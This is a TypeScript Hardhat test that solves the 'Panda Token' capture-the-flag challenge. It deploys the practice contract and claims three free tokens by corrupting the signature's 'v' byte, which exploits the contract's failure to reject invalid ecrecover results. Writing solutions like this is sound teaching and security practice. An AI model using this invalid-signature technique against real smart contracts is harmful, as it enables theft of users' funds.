import {expect} from 'chai';
import {ethers} from 'hardhat';
import {SignerWithAddress} from '@nomiclabs/hardhat-ethers/signers';
import {PandaToken} from '../../types/typechain';

describe('QuillCTF 10: Panda Token', () => {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;

  let contract: PandaToken;

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    contract = await ethers.getContractFactory('PandaToken', owner).then(f => f.deploy(400, 'PandaToken', 'PND'));
    await contract.deployed();
  });

  it('should obtain 3 tokens', async () => {
    // we are provided some reference hash in the foundry setup
    const hash = ethers.utils.keccak256(
      ethers.utils.defaultAbiCoder.encode(
        ['address', 'uint256'],
        [attacker.address, ethers.utils.parseEther('1').toHexString()]
      )
    );

    // confirm that 0 address has high balance, at least 3 * 10^18
    const zeroAddrBalance = await contract.balanceOf(ethers.constants.AddressZero);
    expect(zeroAddrBalance.gt(ethers.utils.parseEther('3'))).to.be.true;

    // commence attack
    const signature = await attacker.signMessage(hash);
    const amount = ethers.utils.parseEther('1');
    for (let i = 0; i < 3; ++i) {
      // change `v` parameter to cause invalid signature
      const badSignature = signature.slice(0, -2) + `0${i}`;

      // get tokens for free
      await contract.connect(attacker).getTokens(amount, badSignature);
    }
  });

  after(async () => {
    expect(await contract.balanceOf(attacker.address)).to.eq(ethers.utils.parseEther('3'));
  });
});
